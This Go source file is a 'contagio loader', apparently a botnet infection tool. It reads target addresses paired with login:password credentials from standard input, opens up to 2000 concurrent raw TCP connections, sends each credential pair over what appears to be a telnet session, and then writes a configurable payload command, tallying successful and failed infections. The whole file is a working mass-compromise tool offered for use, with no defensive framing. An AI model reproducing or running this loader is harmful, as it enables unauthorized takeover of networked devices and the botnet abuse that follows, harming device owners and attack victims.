package main

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
)

const Payload = "YOUR PAYLOAD HERE"

var (
	Delay          = 25 // ms
	ConnectTimeout = 3  // s
	MaxThreads     = 2000
)

var (
	Errors  int64
	Success int64
	All     int64
	Threads int
)

func main() {

	defer func() {
		if er := recover(); er != nil {
			fmt.Print(er)
			return
		}
	}()

	reader := bufio.NewReader(os.Stdin)
	scanner := bufio.NewScanner(reader)

	go status()
	for scanner.Scan() {
		if runtime.NumGoroutine() >= MaxThreads {
			time.Sleep(20 * time.Second)
		}
		atomic.AddInt64(&All, 1)
		_str := scanner.Text()
		str := strings.Split(_str, " ")
		if len(str) != 2 {
			continue
		}

		splitted := strings.Split(str[0], ":")
		if len(splitted) != 2 {
			continue
		}

		port, err := strconv.Atoi(splitted[1])
		ip := net.ParseIP(splitted[0])
		if err != nil {
			continue
		}

		splitted = strings.Split(str[1], ":")
		go load(ip.To4(), port, splitted[0], splitted[1])
		time.Sleep(time.Duration(Delay) * time.Millisecond)
	}

}

func load(ip net.IP, port int, login string, password string) {

	defer func() {
		if err := recover(); err != nil {
			return
		}
	}()

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)

	if err != nil {
		atomic.AddInt64(&Errors, 1)
		return
	}
	defer syscall.Close(fd)

	addr := syscall.SockaddrInet4{
		Port: port,
		Addr: [4]byte(ip),
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(ConnectTimeout)*time.Second)
	defer cancel()

	connected := make(chan bool)

	go func() {

		defer func() {
			if err := recover(); err != nil {
				return
			}
		}()

		err := syscall.Connect(fd, &addr)
		if err != nil {
			atomic.AddInt64(&Errors, 1)
			return
		}

		connected <- true

	}()

	select {
	case <-ctx.Done():
		atomic.AddInt64(&Errors, 1)
		return
	case <-connected:
		break
	}

	syscall.SetNonblock(fd, true)

	_, err = syscall.Write(fd, []byte(login+"\r\n"))
	if err != nil {
		atomic.AddInt64(&Errors, 1)
		return
	}

	time.Sleep(1 * time.Second)
	_, err = syscall.Write(fd, []byte(password+"\r\n"))
	if err != nil {
		atomic.AddInt64(&Errors, 1)
		return
	}
	time.Sleep(1 * time.Second)
	_, err = syscall.Write(fd, []byte(Payload+"\r\n"))
	if err != nil {
		atomic.AddInt64(&Errors, 1)
		return
	}

	atomic.AddInt64(&Success, 1)
}

func status() {
	for {
		fmt.Printf("[contagio loader] All: %d   Success: %d   Errors: %d   Threads: %d\n", All, Success, Errors, runtime.NumGoroutine())
		time.Sleep(1 * time.Second)
	}

}
